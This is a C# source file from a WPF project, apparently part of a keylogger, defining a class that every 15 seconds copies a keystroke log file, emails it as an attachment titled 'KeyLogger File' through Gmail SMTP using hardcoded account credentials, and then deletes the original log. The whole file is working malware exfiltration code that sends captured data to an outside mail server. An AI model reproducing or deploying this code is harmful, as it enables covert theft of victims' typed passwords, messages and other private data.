using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Drawing;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Threading;
using System.Timers;
using System.Net.Mail;
using System.Net;
using System.Net.Mime;

namespace WpfApplication8
{
    class MailHandler
    {
        string mailTo;
        string filename = "rtx32.txt", targetname = "rtx64.txt";
        public void SetTimer(System.Timers.Timer aTimer, string mailbox, StreamWriter file)
        {
            mailTo = mailbox;
            aTimer = new System.Timers.Timer(15000);
            aTimer.Elapsed += (sender, e) => SendMail(sender, e, mailTo, file);
            aTimer.AutoReset = true;
            aTimer.Enabled = true;
        }

        private void SendMail(Object source, ElapsedEventArgs e, string mailTo, StreamWriter file)
        {
            //StreamWriter filefromcopy = new StreamWriter(@"rtx64.txt");
            Console.Write(mailTo);
            CopyFile copyfile = new CopyFile();
            copyfile.CopyTxtFile(filename, targetname);
            string host = "smtp.gmail.com";
            SmtpClient client = new SmtpClient(host, 587);
            client.Credentials = new NetworkCredential("21edqcds@gmail.com", "P@ssw0rd_");
            client.EnableSsl = true;
            MailAddress from = new MailAddress("21edqcds@gmail.com");
            MailAddress to;
            try
            {
                to = new MailAddress(mailTo);
                MailMessage message = new MailMessage(from, to);
                message.Body = "Zawartość pliku txt w załączniku";
                Attachment data = new Attachment(@"rtx64.txt", MediaTypeNames.Application.Octet);
                ContentDisposition disposition = data.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(@"rtx64.txt");
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(@"rtx64.txt");
                disposition.ReadDate = System.IO.File.GetLastAccessTime(@"rtx64.txt");
                message.Attachments.Add(data);
                message.Subject = "KeyLogger File";
                client.Send(message);
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine("Pusty adres e-mail ");
            }
            client.Dispose();
            file.Close();
            //filefromcopy.Close();
            copyfile.DelFile(filename);
            //copyfile.DelFile(targetname);
            //Console.WriteLine(" Message sent ");
            //Console.ReadLine();

        }
    }
}
